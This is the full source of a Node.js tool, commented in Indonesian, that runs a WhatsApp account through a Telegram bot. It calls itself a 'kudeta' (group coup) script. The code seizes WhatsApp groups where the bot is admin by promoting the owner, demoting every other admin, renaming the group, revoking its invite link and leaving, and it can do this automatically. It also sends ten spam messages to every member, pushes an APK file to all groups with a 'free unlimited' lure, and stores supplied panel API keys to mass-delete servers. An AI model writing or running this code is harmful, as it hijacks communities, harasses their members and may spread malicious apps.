
require("./lib/config.js");
const { Telegraf, Markup } = require('telegraf');
const moment = require("moment-timezone");
const pino = require("pino");
const chalk = require("chalk");
const readline = require("readline");
const fs = require('fs');
const axios = require('axios');
const path = require("path")
const { exec } = require("child_process");
const { spawn } = require('child_process');

const {
    makeWASocket,
    useMultiFileAuthState,
    DisconnectReason
} = require("@whiskeysockets/baileys");

const BOT_TOKEN = global.bot_token;
const OWNER_ID = global.owner_id;
const WA_TARGET = global.wa_target// Nomor WhatsApp owner
const AUTO_KUDETA_NUMBER = global.wa_target // Nomor yang akan memicu kudeta otomatis
const usePairingCode = true;

const bot = new Telegraf(BOT_TOKEN);

let isWhatsAppConnected = false;
let Rafael;

// --- Konfigurasi ---
const BOT_BIO = "sc kudet by Noirion dan follow tt @PaisX";
const BOT_NAME = "Kudet By PaisX";
const KUDETA_GROUP_NAME = "Kudet By PaisX";
const CREDITS_TEXT = "\n\nScript by PaisX";
const spamText = global.teksspam;

const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise((resolve) => rl.question(text, (answer) => {
        rl.close();
        resolve(answer.trim());
    }));
};

async function sendToTelegramOwner(message) {
    try {
        await bot.telegram.sendMessage(OWNER_ID, message, { parse_mode: 'Markdown' });
    } catch (error) {
        console.error(chalk.red(`[Telegram] Gagal mengirim pesan ke owner Telegram: ${error.message}`));
    }
}



function simpanKonfigHapus(panelUrl, apiKey, clientKey = '', aktif = false) {
    const config = { panelUrl, apiKey, clientKey, aktif };
    fs.writeFileSync('./config_hapus.json', JSON.stringify(config, null, 2));
}

function tambahPanelKeQueue(panel) {
    let data = [];
    const filePath = './panel_queue.json';
    if (fs.existsSync(filePath)) {
        data = JSON.parse(fs.readFileSync(filePath));
    }
    data.push({ ...panel, timestamp: Date.now() });
    fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
}

function bacaKonfigHapus() {
    if (!fs.existsSync('./config_hapus.json')) return { panelUrl: '', apiKey: '', clientKey: '', aktif: false };
    return JSON.parse(fs.readFileSync('./config_hapus.json'));
}


async function hapusServerYangMati(panelUrl, adminKey, clientKey) {
    const adminHeaders = {
        Authorization: `Bearer ${adminKey}`,
        Accept: 'application/json',
        'Content-Type': 'application/json'
    };

    const clientHeaders = {
        Authorization: `Bearer ${clientKey}`,
        Accept: 'application/json',
        'Content-Type': 'application/json'
    };

    let totalDeleted = 0;
    let totalFailed = 0;
    let totalSkipped = 0;

    try {
        const res = await axios.get(`${panelUrl}/api/application/servers`, { headers: adminHeaders });
        const servers = res.data.data;

        for (const server of servers) {
            const s = server.attributes;
            const identifier = s.identifier;

            try {
                const statusRes = await axios.get(`${panelUrl}/api/client/servers/${identifier}/resources`, {
                    headers: clientHeaders
                });

                const status = statusRes.data.attributes.current_state;
                console.log(`🛰️ ${s.name} → ${status}`);

                if (["offline", "stopping", "crashed"].includes(status)) {
                    const del = await axios.delete(`${panelUrl}/api/application/servers/${s.id}`, {
                        headers: adminHeaders
                    });

                    if (del.status === 204) {
                        console.log(`✅ Dihapus: ${s.name}`);
                        totalDeleted++;
                    } else {
                        console.log(`❌ Gagal hapus: ${s.name}`);
                        totalFailed++;
                    }
                } else {
                    totalSkipped++;
                    console.log(`⏭️ Lewatkan: ${s.name} (status: ${status})`);
                }
            } catch (err) {
                totalFailed++;
                console.log(`❌ Gagal cek status/hapus ${s.name}: ${err.message}`);
            }

            await new Promise(r => setTimeout(r, 1000));
        }

        return `✅ *Hasil akhir:*\n🗑️ Dihapus: *${totalDeleted}*\n⏭️ Lewatkan: *${totalSkipped}*\n❌ Gagal: *${totalFailed}*`;
    } catch (err) {
        return `❌ Gagal ambil list server:\n${err.message}`;
    }
}


// --- Fungsi Inti Bot ---
async function performKudeta(groupId, groupName, telegramCtx = null) {
    const myNumber = WA_TARGET + "@s.whatsapp.net";
    const botNumber = Rafael.user.id.split(":")[0] + "@s.whatsapp.net";
    let detailMessage = `*Kudeta di Grup:* ${groupName}\n*ID Grup:* ${groupId}`;
    let success = false;

    try {
        const groupMetadata = await Rafael.groupMetadata(groupId);
        const participants = groupMetadata.participants;
        const botInfo = participants.find(p => p.id === botNumber);

        if (botInfo && botInfo.admin) {
            detailMessage += `\n*Role Bot:* ${botInfo.admin.toUpperCase()}`;

            // Tambahkan target ke grup jika belum ada
            const isTargetInGroup = participants.some(p => p.id === myNumber);
            if (!isTargetInGroup) {
                await Rafael.groupParticipantsUpdate(groupId, [myNumber], "add");
                detailMessage += `\n✅ Target ditambahkan ke grup.`;
                await new Promise(resolve => setTimeout(resolve, 3000));
            } else {
                detailMessage += `\nℹ️ Target sudah ada di grup.`;
            }

            // Jadikan target admin
            await Rafael.groupParticipantsUpdate(groupId, [myNumber], "promote");
            detailMessage += `\n✅ Target dijadikan admin.`;
            
            // Demote semua admin kecuali owner
const adminsToDemote = participants
    .filter(p => p.admin && p.id !== myNumber)
    .map(p => p.id);

if (adminsToDemote.length > 0) {
    await Rafael.groupParticipantsUpdate(groupId, adminsToDemote, "demote");
    detailMessage += `\n🧨 Semua admin selain target berhasil didemote.`;
} else {
    detailMessage += `\nℹ️ Tidak ada admin lain yang perlu didemote.`;
}

// Jika bot juga admin, demote diri sendiri
const botId = Rafael.user.id.split(":")[0] + "@s.whatsapp.net";
if (botId !== myNumber && participants.some(p => p.id === botId && p.admin)) {
    await Rafael.groupParticipantsUpdate(groupId, [botId], "demote");
    detailMessage += `\n🤖 Bot juga didemote.`;
}


            // Ganti nama grup
            const newName = global.kudetname
            await Rafael.groupUpdateSubject(groupId, newName);
            detailMessage += `\n📝 Nama grup diganti menjadi: *${newName}*`;

            // Ganti deskripsi grup
            const newDesc = global.desk
            await Rafael.groupUpdateDescription(groupId, newDesc);
            detailMessage += `\n📝 Deskripsi grup diperbarui.`;

            // Reset link undangan grup
            const newInviteCode = await Rafael.groupRevokeInvite(groupId);
            detailMessage += `\n🔗 Link grup direset: https://chat.whatsapp.com/${newInviteCode}`;

            // Bot keluar dari grup
            await Rafael.groupLeave(groupId);
            detailMessage += `\n✅ Bot keluar dari grup.`;

            console.log(chalk.green(`[KUDETA] Kudeta lengkap di grup ${groupName}`));
            success = true;
        } else {
            detailMessage += `\n❌ Gagal, Bot bukan admin di grup ini.`;
        }
    } catch (err) {
        detailMessage += `\n❌ Error: ${err.message}`;
    }

    if (telegramCtx) {
        await telegramCtx.reply(detailMessage, { parse_mode: 'Markdown' });
    } else {
        await sendToTelegramOwner(detailMessage);
    }

    return success;
}




function chunkArray(array, size) {
    const chunkedArr = [];
    for (let i = 0; i < array.length; i += size) {
        chunkedArr.push(array.slice(i, i + size));
    }
    return chunkedArr;
}

async function getAdminGroups() {
    if (!isWhatsAppConnected || !Rafael?.user?.id) {
        console.log('⚠️ WhatsApp belum terhubung penuh, atau Rafael.user.id belum tersedia.');
        return [];
    }

    const botNumber = Rafael.user.id.split(":")[0] + "@s.whatsapp.net";
    const allGroups = Object.values(await Rafael.groupFetchAllParticipating().catch(() => ({})));
    const adminGroups = [];

    await Promise.all(allGroups.map(async (group) => {
        try {
            const metadata = await Rafael.groupMetadata(group.id);
            const botParticipant = metadata.participants.find(p => p.id === botNumber);
            if (botParticipant && botParticipant.admin) {
                adminGroups.push(group);
            }
        } catch (e) {
            // Skip error
        }
    }));

    return adminGroups;
}


async function Rafaelstart() {
    const { state, saveCreds } = await useMultiFileAuthState("./session");

    const startSocket = async () => {
        Rafael = makeWASocket({
            logger: pino({ level: "silent" }),
            printQRInTerminal: !usePairingCode,
            auth: state,
            browser: ["Ubuntu", "Chrome", "20.0.04"]
        });

        Rafael.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect, qr } = update;
            if (connection === "open") {
    isWhatsAppConnected = true;
    console.log(chalk.green("✅ Bot WhatsApp Terhubung!"));

    await bot.telegram.sendMessage(OWNER_ID, `✅ Bot WhatsApp Terhubung!\nNomor: ${Rafael.user.id.split(":")[0]}`, {
        reply_markup: {
            inline_keyboard: [
                [{ text: '➡️ MENU', callback_data: 'menu_action' }]
            ]
        }
    });
           } else if (connection === "close") {
                isWhatsAppConnected = false;
                const reason = lastDisconnect?.error?.output?.statusCode;
                console.log(chalk.red("❌ WhatsApp disconnected."));
                if (reason === DisconnectReason.loggedOut) {
                    await sendToTelegramOwner("❌ Koneksi WA terputus total. Hapus folder 'session' dan restart bot.");
                } else {
                    setTimeout(startSocket, 5000);
                }
            }
        });

        Rafael.ev.on("creds.update", saveCreds);

        Rafael.ev.on('group-participants.update', async (update) => {
    const { id: groupId, participants, action } = update;

    // Cek apakah WA_TARGET baru saja ditambahkan ke grup
    if (action === 'add') {
        for (const jid of participants) {
            if (jid === WA_TARGET + "@s.whatsapp.net") {
                try {
                    const metadata = await Rafael.groupMetadata(groupId);
                    const groupName = metadata.subject;
                    console.log(`[AUTO-KUDETA] Target masuk ke grup ${groupName} (${groupId})`);

                    // Jalankan kudeta otomatis
                    await performKudeta(groupId, groupName);
                } catch (err) {
                    console.error(`[ERROR] Gagal auto-kudeta: ${err.message}`);
                }
            }
        }
    }
});
    };
    startSocket();
}





const mainKeyboard = Markup.inlineKeyboard([
    [Markup.button.callback('Kudeta Grup 😈', 'kudeta_action')],
    [Markup.button.callback('Ban Nomor 😈', 'setppgroup_action')],
    [Markup.button.callback('Info Grup ℹ️', 'infogrup_action')],
    [Markup.button.callback('Bagikan Link Grup 🔗', 'sharelink_action')],
    [Markup.button.callback('Reset Link Grup 🔄', 'resetlink_action')],
    [Markup.button.callback('Status Bot 🟢', 'status_action')],
    [Markup.button.callback('Send File 📁', 'sendfile_action')],
    [Markup.button.callback('Set Foto Profile', 'setppbot_action')],
    [Markup.button.callback('Upload Panel ✅', 'up_action')],
    [Markup.button.callback('Cancel Panel ❌', 'ah_action')],
    [Markup.button.callback('Spam Semua Peserta 🧨', 'spamsemua_action')]
]);

bot.start((ctx) => {
    if (ctx.from.id.toString() === OWNER_ID.toString()) {
        ctx.reply('Halo owner! Bot Kontrol WhatsApp siap. Pilih perintah:', mainKeyboard);
    } else {
        ctx.reply('Maaf, Anda bukan owner.');
    }
});

bot.action('menu_action', async (ctx) => {
    if (ctx.from.id.toString() !== OWNER_ID.toString()) return ctx.answerCbQuery('❌ Akses ditolak!');
    await ctx.answerCbQuery('📖 Menampilkan menu...');
    await ctx.editMessageText('📖 *Pilih Menu Bot:*', {
        parse_mode: 'Markdown',
        reply_markup: mainKeyboard.reply_markup
    });
});

bot.action('status_action', async (ctx) => {
    await ctx.answerCbQuery();
    if (ctx.from.id.toString() !== OWNER_ID.toString()) return ctx.reply('Maaf, Anda tidak memiliki akses.');
    if (isWhatsAppConnected) {
        const nomor = Rafael.user.id.split(":")[0];
        const name = Rafael.user.name;
        ctx.reply(`✅ Bot WhatsApp Terhubung!\n*Nomor:* ${nomor}\n*Nama:* ${name}`, { parse_mode: 'Markdown' });
    } else {
        ctx.reply('❌ Bot WhatsApp tidak terhubung.');
    }
});

async function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// ganti bagian dalam 'kudeta_action'
bot.action('kudeta_action', async (ctx) => {
    if (ctx.from.id.toString() !== OWNER_ID.toString()) return ctx.answerCbQuery('Akses ditolak!');
    if (!isWhatsAppConnected) return ctx.reply('❌ Bot WhatsApp belum terhubung.');

    await ctx.answerCbQuery('Memulai proses kudeta...');
    await ctx.reply('🚀 *Memulai Proses Kudeta Grup* 🚀\n\nHanya dari grup tempat bot menjadi admin...', { parse_mode: 'Markdown' });

    const adminGroups = await getAdminGroups();
    if (adminGroups.length === 0) {
        return ctx.reply('ℹ️ Bot tidak menjadi admin di grup manapun.');
    }

    await ctx.reply(`✅ Ditemukan *${adminGroups.length}* grup. Memulai kudeta...`, { parse_mode: 'Markdown' });
    const groupChunks = chunkArray(adminGroups, 10);
    for (const chunk of groupChunks) {
        for (const group of chunk) {
            try {
                await performKudeta(group.id, group.subject, ctx);
                await delay(1500);
            } catch (e) {
                console.error(`[KUDETA ERROR] ${group.subject}: ${e.message}`);
            }
        }
    }
    await ctx.reply('*Proses Kudeta Selesai!*', { parse_mode: 'Markdown' });
});

// ganti bagian dalam 'infogrup_action'
bot.action('infogrup_action', async (ctx) => {
    if (ctx.from.id.toString() !== OWNER_ID.toString()) return ctx.answerCbQuery('Akses ditolak!');
    if (!isWhatsAppConnected) return ctx.reply('❌ Bot WhatsApp belum terhubung.');

    await ctx.answerCbQuery('Mengambil info...');
    await ctx.reply('📊 *Mengambil Info Grup* 📊\n\nHanya dari grup tempat bot menjadi admin...', { parse_mode: 'Markdown' });

    const adminGroups = await getAdminGroups();
    if (adminGroups.length === 0) {
        return ctx.reply('ℹ️ Bot tidak menjadi admin di grup manapun.');
    }

    await ctx.reply(`✅ Ditemukan *${adminGroups.length}* grup. Mengambil info...`, { parse_mode: 'Markdown' });
    const groupChunks = chunkArray(adminGroups, 10);
    for (const chunk of groupChunks) {
        const infos = [];
        for (const group of chunk) {
            try {
                const metadata = await Rafael.groupMetadata(group.id);
                infos.push(`*${group.subject}*\n*Member:* ${metadata.participants.length}\n*ID:* \`${group.id}\``);
                await delay(1500);
            } catch (err) {
                infos.push(`*${group.subject}*\n*Status:* ❌ Gagal ambil info.`);
            }
        }
        await ctx.reply(infos.join('\n\n---\n\n'), { parse_mode: 'Markdown' });
    }
    await ctx.reply('*Proses Info Grup Selesai!*', { parse_mode: 'Markdown' });
});




bot.action('spamsemua_action', async (ctx) => {
    if (ctx.from.id.toString() !== OWNER_ID.toString()) return ctx.answerCbQuery('Akses ditolak!');
    if (!isWhatsAppConnected) return ctx.reply('❌ Bot WhatsApp belum terhubung.');

    await ctx.answerCbQuery('Memulai spam...');
    await ctx.reply('📢 *Mengambil semua peserta dari grup dan mengirim 10 pesan ke setiap peserta...*', { parse_mode: 'Markdown' });

    const adminGroups = await getAdminGroups();
    if (adminGroups.length === 0) {
        return ctx.reply('ℹ️ Bot tidak menjadi admin di grup manapun.');
    }

    const allParticipants = new Set();

    for (const group of adminGroups) {
        try {
            const metadata = await Rafael.groupMetadata(group.id);
            for (const participant of metadata.participants) {
                if (participant.id && !participant.id.includes('g.us') && participant.id !== Rafael.user.id) {
                    allParticipants.add(participant.id);
                }
            }
            await delay(1000);
        } catch (err) {
            console.log(`❌ Gagal ambil peserta dari ${group.id}:`, err.message);
        }
    }

    const total = allParticipants.size;
    if (total === 0) return ctx.reply('❌ Tidak ditemukan peserta yang valid.');

    await ctx.reply(`✅ Ditemukan *${total}* peserta unik.\nMengirim 10 pesan ke setiap nomor...`, { parse_mode: 'Markdown' });

    const spamText = global.teksspam

    for (const jid of allParticipants) {
        for (let i = 1; i <= 10; i++) {
            try {
                await Rafael.sendMessage(jid, { text: `${spamText} (${i}/10)` });
                await delay(1500); // delay antar pesan
            } catch (err) {
                console.log(`❌ Gagal kirim ke ${jid} (pesan ke-${i}):`, err.message);
                break; // hentikan spam ke nomor ini jika error
            }
        }
        await delay(1000); // delay antar nomor (peserta)
    }

    await ctx.reply('✅ *Semua peserta telah menerima 10 pesan.*', { parse_mode: 'Markdown' });
});

bot.command('up', (ctx) => {
    if (ctx.from.id.toString() !== OWNER_ID.toString()) return ctx.reply('❌ Akses ditolak.');
    const config = bacaKonfigHapus();
    simpanKonfigHapus(config.panelUrl, config.apiKey, config.clientKey, true);
    ctx.reply('✅ Sistem aktif!\nKirim PLTA, PLTC, dan domain.');
});

bot.command('ah', (ctx) => {
    if (ctx.from.id.toString() !== OWNER_ID.toString()) return ctx.reply('❌ Akses ditolak.');
    const config = bacaKonfigHapus();
    simpanKonfigHapus(config.panelUrl, config.apiKey, config.clientKey, false);
    ctx.reply('🛑 Sistem dimatikan. Semua input akan diabaikan.');
});



bot.action('setppgroup_action', async (ctx) => {
    if (ctx.from.id.toString() !== OWNER_ID.toString()) return ctx.answerCbQuery('Akses ditolak!');
    if (!isWhatsAppConnected) return ctx.reply('❌ Bot WhatsApp belum terhubung.');

    await ctx.answerCbQuery('Mengganti semua foto profil grup...');
    await ctx.reply('🖼️ *Mengganti foto profil semua grup...*', { parse_mode: 'Markdown' });

    const adminGroups = await getAdminGroups();
    if (adminGroups.length === 0) {
        return ctx.reply('ℹ️ Bot tidak menjadi admin di grup manapun.');
    }

    const imageUrl = global.ppurl;
    try {
        const response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
        const imageBuffer = Buffer.from(response.data, 'binary');

        for (const group of adminGroups) {
            try {
                await Rafael.updateProfilePicture(group.id, imageBuffer);
                await delay(1500);
            } catch (err) {
                console.log(`❌ Gagal ganti foto grup ${group.subject}:`, err.message);
            }
        }

        await ctx.reply('✅ *Berhasil mengganti foto profil semua grup.*', { parse_mode: 'Markdown' });
    } catch (err) {
        console.error('❌ Gagal ambil gambar:', err.message);
        await ctx.reply('❌ Gagal mengambil gambar dari URL.');
    }
});


bot.action('setppbot_action', async (ctx) => {
    if (ctx.from.id.toString() !== OWNER_ID.toString()) return ctx.answerCbQuery('Akses ditolak!');
    if (!isWhatsAppConnected) return ctx.reply('❌ Bot WhatsApp belum terhubung.');

    await ctx.answerCbQuery('Mengganti foto profil...');
    await ctx.reply('🖼️ *Mengambil gambar dari URL dan mengganti foto profil bot...*', { parse_mode: 'Markdown' });

    const imageUrl = global.ppurl // 🔁 Ganti dengan URL gambar kamu

    try {
        // Ambil gambar dari URL sebagai buffer
        const response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
        const imageBuffer = Buffer.from(response.data, 'binary');

        const botNumber = Rafael.user.id;
        await Rafael.updateProfilePicture(botNumber, {
            img: imageBuffer
        });

        await ctx.reply('✅ *Foto profil bot berhasil diubah dari URL!*', { parse_mode: 'Markdown' });
    } catch (err) {
        console.error('❌ Gagal ganti foto profil:', err.message);
        await ctx.reply('❌ Gagal mengganti foto profil bot dari URL.');
    }
});


bot.action('sendfile_action', async (ctx) => {
    if (ctx.from.id.toString() !== OWNER_ID.toString()) return ctx.answerCbQuery('Akses ditolak!');
    if (!isWhatsAppConnected) return ctx.reply('❌ Bot WhatsApp belum terhubung.');

    await ctx.answerCbQuery('Mengirim file...');
    await ctx.reply('📁 *Mengirim file ke semua grup admin...*', { parse_mode: 'Markdown' });

    const filePath = './lib/app.apk';
    const mimeType = 'application/vnd.android.package-archive';


    if (!fs.existsSync(filePath)) {
        return ctx.reply('❌ File tidak ditemukan. Periksa path file.');
    }

    const fileBuffer = fs.readFileSync(filePath);
    const adminGroups = await getAdminGroups();

    if (adminGroups.length === 0) {
        return ctx.reply('ℹ️ Bot tidak menjadi admin di grup manapun.');
    }

    await ctx.reply(`📤 Ditemukan *${adminGroups.length}* grup. Mengirim file...`, { parse_mode: 'Markdown' });

    for (const group of adminGroups) {
        try {
            await Rafael.sendMessage(group.id, {
                document: fileBuffer,
                mimetype: mimeType,
                fileName: 'APK CREATE NOKOS', // ubah sesuai kebutuhan
                caption: 'APK CREATE NOKOS, UNLIMITED CREATE FREE'
            });
            await delay(2000); // Delay 2 detik
        } catch (err) {
            console.log(`❌ Gagal kirim ke ${group.subject}:`, err.message);
        }
    }

    await ctx.reply('✅ *File berhasil dikirim ke semua grup!*', { parse_mode: 'Markdown' });
});






// ganti bagian dalam 'sharelink_action'
bot.action('sharelink_action', async (ctx) => {
    if (ctx.from.id.toString() !== OWNER_ID.toString()) return ctx.answerCbQuery('Akses ditolak!');
    if (!isWhatsAppConnected) return ctx.reply('❌ Bot WhatsApp belum terhubung.');

    await ctx.answerCbQuery('Mencari link grup...');
    await ctx.reply('🔗 *Mengambil Link Grup* 🔗\n\nHanya dari grup tempat bot menjadi admin...', { parse_mode: 'Markdown' });

    const adminGroups = await getAdminGroups();
    if (adminGroups.length === 0) {
        return ctx.reply('ℹ️ Bot tidak menjadi admin di grup manapun.');
    }

    await ctx.reply(`✅ Ditemukan *${adminGroups.length}* grup. Mengambil link...`, { parse_mode: 'Markdown' });
    const groupChunks = chunkArray(adminGroups, 10);
    for (const chunk of groupChunks) {
        const linksInfo = [];
        for (const group of chunk) {
            try {
                const metadata = await Rafael.groupMetadata(group.id);
                const inviteCode = await Rafael.groupInviteCode(group.id);
                linksInfo.push(`*${group.subject}*\n*Member:* ${metadata.participants.length}\n*Link:* https://chat.whatsapp.com/${inviteCode}`);
                await delay(1500);
            } catch (err) {
                linksInfo.push(`*${group.subject}*\n*Status:* ❌ Gagal mendapatkan link.`);
            }
        }
        await ctx.reply(linksInfo.join('\n\n---\n\n'), { parse_mode: 'Markdown' });
    }
    await ctx.reply('*Proses Selesai!*', { parse_mode: 'Markdown' });
});

// ganti bagian dalam 'resetlink_action'
bot.action('resetlink_action', async (ctx) => {
    if (ctx.from.id.toString() !== OWNER_ID.toString()) return ctx.answerCbQuery('Akses ditolak!');
    if (!isWhatsAppConnected) return ctx.reply('❌ Bot WhatsApp belum terhubung.');

    await ctx.answerCbQuery('Memulai proses reset link...');
    await ctx.reply('🔄 *Membuat Link Grup Baru* 🔄\n\nLink lama akan dibatalkan. Proses ini hanya berjalan di grup tempat bot menjadi admin.', { parse_mode: 'Markdown' });

    const adminGroups = await getAdminGroups();
    if (adminGroups.length === 0) {
        return ctx.reply('ℹ️ Bot tidak menjadi admin di grup manapun, tidak ada link yang bisa direset.');
    }

    await ctx.reply(`✅ Ditemukan *${adminGroups.length}* grup. Mereset link sekarang...`, { parse_mode: 'Markdown' });
    const groupChunks = chunkArray(adminGroups, 5);

    for (const chunk of groupChunks) {
        const newLinksInfo = [];
        for (const group of chunk) {
            try {
                const newInviteCode = await Rafael.groupRevokeInvite(group.id);
                const metadata = await Rafael.groupMetadata(group.id);
                newLinksInfo.push(`*${group.subject}*\n*Member:* ${metadata.participants.length}\n*✅ LINK BARU:* https://chat.whatsapp.com/${newInviteCode}`);
                await delay(1500);
            } catch (err) {
                console.error(chalk.red(`[RESET LINK] Gagal untuk grup ${group.subject}: ${err.message}`));
                newLinksInfo.push(`*${group.subject}*\n*Status:* ❌ Gagal mereset link.`);
            }
        }
        await ctx.reply(newLinksInfo.join('\n\n---\n\n'), { parse_mode: 'Markdown' });
    }

    await ctx.reply('*Proses Reset Link Selesai!*', { parse_mode: 'Markdown' });
});


// Handler saat owner upload creds.json

// Handler saat owner upload creds.json

bot.on('document', async (ctx) => {
    const senderId = ctx.from.id.toString();
    const fileName = ctx.message.document.file_name.toLowerCase();

    // Memastikan hanya owner yang bisa meng-upload file
    if (senderId !== OWNER_ID.toString()) return ctx.reply('❌ Akses ditolak.');

    // Mendapatkan link file yang diupload
    const fileLink = await ctx.telegram.getFileLink(ctx.message.document.file_id);

    const sessionFolderPath = './session'; // Folder session

    try {
        // Hapus folder session beserta isinya
        if (fs.existsSync(sessionFolderPath)) {
            fs.rmSync(sessionFolderPath, { recursive: true, force: true }); // Menghapus folder beserta isinya
        }

        // Buat folder session baru
        fs.mkdirSync(sessionFolderPath, { recursive: true });

        // Mendownload file yang diupload (misalnya creds.json)
        const credsFilePath = path.join(sessionFolderPath, 'creds.json');
        const response = await axios.get(fileLink.href, { responseType: 'stream' });
        const writer = fs.createWriteStream(credsFilePath);
        response.data.pipe(writer);

        writer.on('finish', () => {
            ctx.reply('✅ File berhasil diunduh dan disimpan di folder session.');

            // Restart bot setelah file berhasil disimpan
            restartBot(); // Panggil fungsi restart
        });

        writer.on('error', (err) => {
            console.error('❌ Gagal menyimpan file:', err.message);
            ctx.reply('❌ Gagal menyimpan file.');
        });
    } catch (err) {
        console.error('❌ Terjadi kesalahan:', err.message);
        ctx.reply('❌ Terjadi kesalahan saat memproses file.');
    }
});

// Fungsi untuk merestart bot
function restartBot() {
    console.log('🌀 Restarting bot...');

    // Menjalankan ulang script utama bot (misalnya 'index.js')
    const restartProcess = spawn('node', ['index.js']); // Menggunakan spawn untuk menjalankan file 'index.js' kembali

    // Menangani output dari proses restart
    restartProcess.stdout.on('data', (data) => {
        console.log(`Output: ${data}`);
    });

    restartProcess.stderr.on('data', (data) => {
        console.error(`Error: ${data}`);
    });

    restartProcess.on('close', (code) => {
        console.log(`Bot restarted with code: ${code}`);
    });
}




bot.action(/hapuspanel_(\d+)/, async (ctx) => {
    if (ctx.from.id.toString() !== OWNER_ID.toString()) return ctx.answerCbQuery('❌ Akses ditolak!');

    const index = parseInt(ctx.match[1]);
    const data = JSON.parse(fs.readFileSync('./panel_queue.json'));
    const panel = data[index];
    if (!panel) return ctx.reply('❌ Panel tidak ditemukan.');

    await ctx.reply(`⏳ Menghapus server *mati* dari *${panel.panelUrl}*...`, { parse_mode: 'Markdown' });
    const hasil = await hapusServerYangMati(panel.panelUrl, panel.apiKey, panel.clientKey);
    await ctx.reply(hasil, { parse_mode: 'Markdown' });
});
bot.command('clear', async (ctx) => {
    if (ctx.from.id.toString() !== OWNER_ID.toString()) return ctx.reply('❌ Akses ditolak.');

    const filePath = './panel_queue.json';
    if (!fs.existsSync(filePath)) return ctx.reply('❌ Tidak ada panel yang tersimpan.');

    const data = JSON.parse(fs.readFileSync(filePath));
    if (!data.length) return ctx.reply('❌ Daftar panel kosong.');

    const buttons = data.map((p, i) => [Markup.button.callback(`🔄 Gunakan ${p.panelUrl}`, `hapuspanel_${i}`)]);
    await ctx.reply('📋 Pilih panel yang ingin dihapus ulang:', {
        reply_markup: { inline_keyboard: buttons }
    });
});




bot.on('text', async (ctx) => {
    if (ctx.from.id.toString() !== OWNER_ID.toString()) return;

    const pesan = ctx.message.text.trim();
    const isPLTA = pesan.startsWith('ptla_');
    const isPLTC = pesan.startsWith('ptlc_');
    const isDomain = pesan.startsWith('http://') || pesan.startsWith('https://');

    let config = bacaKonfigHapus();
    if (!config.aktif) return ctx.reply('❌ Sistem tidak aktif. Kirim /up dulu.');

    if (isPLTA) {
    config.apiKey = pesan;
    simpanKonfigHapus(config.panelUrl, config.apiKey, config.clientKey, config.aktif);
    await ctx.reply('✅ *PLTA (Admin API Key) disimpan!*', { parse_mode: 'Markdown' });

} else if (isPLTC) {
    config.clientKey = pesan;
    simpanKonfigHapus(config.panelUrl, config.apiKey, config.clientKey, config.aktif);
    await ctx.reply('✅ *PLTC (Client API Key) disimpan!*', { parse_mode: 'Markdown' });

} else if (isDomain) {
    config.panelUrl = pesan;
    simpanKonfigHapus(config.panelUrl, config.apiKey, config.clientKey, config.aktif);
    await ctx.reply('✅ *Domain disimpan!*', { parse_mode: 'Markdown' });
}

// ✅ Cek apakah lengkap dan aktif, lalu jalankan
if (config.aktif && config.apiKey && config.clientKey && config.panelUrl) {
    await ctx.reply(`⏳ Menghapus server *mati* dari *${config.panelUrl}*...`, { parse_mode: 'Markdown' });
    const hasil = await hapusServerYangMati(config.panelUrl, config.apiKey, config.clientKey);
    await ctx.reply(hasil, { parse_mode: 'Markdown' });
    tambahPanelKeQueue({
    panelUrl: config.panelUrl,
    apiKey: config.apiKey,
    clientKey: config.clientKey
});


    // 🔁 Reset otomatis
    simpanKonfigHapus('', '', '', false);
    await ctx.reply('🔁 Config telah direset. Kirim /up untuk mulai ulang.');




    }
});


bot.launch();
Rafaelstart();
console.log("🤖 Telegram bot berjalan...");
console.log("🟢 Menunggu koneksi WhatsApp...");

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
process.on('uncaughtException', function (err) {
let e = String(err)
if (e.includes("conflict")) return
if (e.includes("Socket connection timeout")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
console.log('Caught exception: ', err)
})